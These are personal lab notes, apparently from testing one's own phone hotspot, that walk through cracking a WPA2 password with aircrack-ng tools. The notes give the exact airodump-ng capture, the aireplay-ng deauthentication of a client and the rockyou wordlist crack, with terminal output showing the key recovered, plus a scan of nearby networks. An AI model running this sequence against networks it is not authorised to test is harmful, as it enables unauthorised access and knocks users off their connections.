
SSID: phone
DS Parameter set: channel 1
BSSID: 0A:91:71:AD:B9:A8

`sudo airodump-ng -c 1 --bssid 0A:91:71:AD:B9:A8 -w output-file wlan0`

`sudo aireplay-ng -0 1 -a 0A:91:71:AD:B9:A8 -c B0:C0:90:BD:E7:8F wlan0`

`sudo aircrack-ng -a 2 -b 0A:91:71:AD:B9:A8 -w /usr/share/wordlists/rockyou.txt output*cap`

set to managed mode and connect viw gui or

connect to wifi via the terminal
`wpa_passphrase phone 'qwerty123' > config`
`sudo wpa_supplicant -B -c config -i wlan0`



### Details

```sh
BSS 0a:91:71:ad:b9:a8(on wlan0)
        TSF: 206359250 usec (0d, 00:03:26)
        freq: 2412.0
        beacon interval: 100 TUs
        capability: ESS Privacy SpectrumMgmt ShortSlotTime RadioMeasure (0x1511)
        signal: -20.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: phone
        Supported rates: 1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 
        DS Parameter set: channel 1
        Country: SE     Environment: Indoor/Outdoor
                Channels [1 - 13] @ -128 dBm
        Power constraint: 0 dB
        TPC report: TX power: 18 dBm
        ERP: <no flags>
        Extended supported rates: 6.0 9.0 12.0 48.0 
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 16-PTKSA-RC 1-GTKSA-RC (0x000c)
        HT capabilities:
                Capabilities: 0x2d
                        RX LDPC
                        HT20
                        SM Power Save disabled
                        RX HT20 SGI
                        No RX STBC
                        Max AMSDU length: 3839 bytes
                        No DSSS/CCK HT40
                Maximum RX AMPDU length 65535 bytes (exponent: 0x003)
                Minimum RX AMPDU time spacing: 8 usec (0x06)
                HT RX MCS rate indexes supported: 0-15
                HT TX MCS rate indexes are undefined
        HT operation:
                 * primary channel: 1
                 * secondary channel offset: no secondary
                 * STA channel width: 20 MHz
                 * RIFS: 0
                 * HT protection: no
                 * non-GF present: 0
                 * OBSS non-GF present: 0
                 * dual beacon: 0
                 * dual CTS protection: 0
                 * STBC beacon: 0
                 * L-SIG TXOP Prot: 0
                 * PCO active: 0
                 * PCO phase: 0
        Extended capabilities:
                 * Extended Channel Switching
                 * BSS Transition
                 * Multiple BSSID
                 * Operating Mode Notification
        WMM:     * Parameter version 1
                 * BE: CW 15-1023, AIFSN 3
                 * BK: CW 15-1023, AIFSN 7
                 * VI: CW 7-15, AIFSN 2, TXOP 3008 usec
                 * VO: CW 3-7, AIFSN 2, TXOP 1504 usec

```

scan
```sh
 CH  5 ][ Elapsed: 19 s ][ 2024-12-12 15:15 ][ interface wlan0 down                                                          
                                                                                                                             
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                             
                                                                                                                             
 B8:D4:BC:28:35:06  -90        2        0    0  11  720   WPA3 CCMP   SAE  TN_wifi_283506                                    
 34:5D:9E:99:F2:AD  -85        3        0    0  11  260   WPA2 CCMP   PSK  Tele2_99f2a8                                      
 F4:F2:6D:A1:62:81  -51        4        0    0  11  195   WPA2 CCMP   PSK  HBV95                                             
 78:54:2E:B0:76:70  -59        7        0    0  11  195   WPA2 CCMP   PSK  HBV95                                             
 28:9E:FC:4A:13:B4  -81        6        0    0   1  260   WPA2 CCMP   PSK  COMHEM_4a13af                                     
 0A:91:71:AD:B9:A8  -76       18        0    0   1  130   WPA2 CCMP   PSK  phone                                             
                                                                                                                             
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                           
                                                                                                                             
 78:54:2E:B0:76:70  40:4E:36:1A:BD:1C  -30    0 - 1e     0        1   
```


catching traffic
```sh
┌──(kali㉿kali)-[~/wifi-test]
└─$ sudo airodump-ng -c 1 --bssid 0A:91:71:AD:B9:A8 -w output-file wlan0
16:22:35  Created capture file "output-file-02.cap".

 CH  1 ][ Elapsed: 3 mins ][ 2024-12-12 16:26 ][ WPA handshake: 0A:91:71:AD:B9:A8                                            
                                                                                                                             
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                         
                                                                                                                             
 0A:91:71:AD:B9:A8  -19  61     1679     1325    0   1  130   WPA2 CCMP   PSK  phone                                         
                                                                                                                             
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                           
                                                                                                                             
 0A:91:71:AD:B9:A8  B0:C0:90:BD:E7:8F  -33    1e- 1e     0     1507    
```

sending deauth from separate terminal - will be logged ^
```sh
┌──(kali㉿kali)-[~]
└─$ sudo aireplay-ng -0 1 -a 0A:91:71:AD:B9:A8 -c B0:C0:90:BD:E7:8F wlan0
[sudo] password for kali: 
16:20:59  Waiting for beacon frame (BSSID: 0A:91:71:AD:B9:A8) on channel 1
16:21:00  Sending 64 directed DeAuth (code 7). STMAC: [B0:C0:90:BD:E7:8F] [67|46 ACKs]
```

ctrl+c and the log files are there
```sh
┌──(kali㉿kali)-[~/wifi-test]
└─$ ls -la                                                       
total 1848
drwxrwxr-x  2 kali kali    4096 Dec 12 16:22 .
drwx------ 63 kali kali    4096 Dec 12 16:16 ..
-rw-r--r--  1 root root   21369 Dec 12 16:22 output-file-01.cap
-rw-r--r--  1 root root     379 Dec 12 16:22 output-file-01.csv
-rw-r--r--  1 root root     582 Dec 12 16:22 output-file-01.kismet.csv
-rw-r--r--  1 root root    1694 Dec 12 16:22 output-file-01.kismet.netxml
-rw-r--r--  1 root root   15361 Dec 12 16:22 output-file-01.log.csv
-rw-r--r--  1 root root 1406620 Dec 12 16:26 output-file-02.cap
-rw-r--r--  1 root root     475 Dec 12 16:26 output-file-02.csv
-rw-r--r--  1 root root     590 Dec 12 16:26 output-file-02.kismet.csv
-rw-r--r--  1 root root    2768 Dec 12 16:26 output-file-02.kismet.netxml
-rw-r--r--  1 root root  406890 Dec 12 16:26 output-file-02.log.csv

```

crack it
```sh
┌──(kali㉿kali)-[~/wifi-test]
└─$ sudo aircrack-ng -a 2 -b 0A:91:71:AD:B9:A8 -w /usr/share/wordlists/rockyou.txt output*cap
Reading packets, please wait...
Opening output-file-01.cap
Read 107 packets.

1 potential targets

Opening output-file-02.cap
Resetting EAPOL Handshake decoder state.

                               Aircrack-ng 1.7 

      [00:00:00] 2083/10303727 keys tested (4850.19 k/s) 

      Time left: 35 minutes, 23 seconds                          0.02%

                           KEY FOUND! [ qwerty123 ]


      Master Key     : 45 E6 B2 F4 3F A6 A4 E8 B7 56 5B 32 6C 31 35 C0 
                       B9 B0 71 B9 FE BF 04 5C B4 75 AD 51 1F 15 A5 41 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : FD FF 7B 06 42 3D C9 C4 0C E0 97 18 C2 F1 95 22 
```
